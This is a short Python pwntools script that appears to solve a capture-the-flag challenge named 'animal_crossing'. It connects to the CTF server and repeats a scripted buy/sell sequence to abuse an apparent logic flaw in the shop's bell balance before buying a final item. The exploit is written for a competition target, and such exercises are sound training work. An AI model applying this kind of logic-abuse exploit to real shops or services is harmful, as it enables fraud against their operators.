from pwn import *

# p = process("./animal_crossing")
p = remote("ctf.umbccd.io", 4400)

def buy(idx):
    p.sendlineafter(': ', '2')
    p.sendlineafter('420000 bells\n', str(idx))

def sell(idx):
    p.sendlineafter(': ', '1')
    p.sendline(str(idx))

def exploit():
    sell(1)
    sell(2)
    sell(2)
    sell(3)
    sell(4)
    buy(2)

    for i in range(50):
        print i
        sell(1)
        sleep(1)
    
    buy(6)
    p.sendlineafter(': ', '1')


    p.interactive()

if __name__ == "__main__":
    exploit()